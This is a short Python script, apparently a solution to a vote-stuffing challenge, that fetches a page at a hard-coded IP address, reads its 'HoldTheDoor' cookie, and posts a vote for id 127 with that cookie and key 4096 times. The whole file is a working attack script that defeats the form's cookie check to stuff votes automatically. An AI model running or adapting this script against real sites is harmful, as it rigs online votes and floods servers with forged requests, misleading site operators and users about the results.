#!/usr/bin/python3
import requests

url = 'http://158.69.76.135/level1.php'
r = requests.get(url)
key = r.cookies['HoldTheDoor']
data = {
    'id': '127',
    'holdthedoor': 'Submit',
    'key': key
}
for i in range(4096):
    requests.post(url, data=data, cookies={'HoldTheDoor': key})
